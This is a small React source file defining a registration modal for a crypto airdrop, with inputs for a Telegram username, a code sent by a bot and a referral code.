import React from 'react';
import './Auth.css';

const Auth = () => {
    return (
        <div id="modal">
            {/* Registration View */}
            <div className="view active" id="register-view">
                <h2>&#x1F43B; Bera Let's Go !!! &#x1F680;</h2>
                <center>
                    <span className="warning-icon">&#9888;</span>
                    <i className="warning-text"> Give your original username <br /> otherwise you may lose the airdrop</i>
                </center>
                <br /><br />
                <input type="text" id="register-username" placeholder="Telegram username" />
                <input type="password" id="register-password" placeholder="Code sent on the bot" />
                <input type="password" id="register-repassword" placeholder="Referral code" />
                <button id="register-button">Let Me In !</button>
            </div>
        </div>
    );
};

export default Auth;
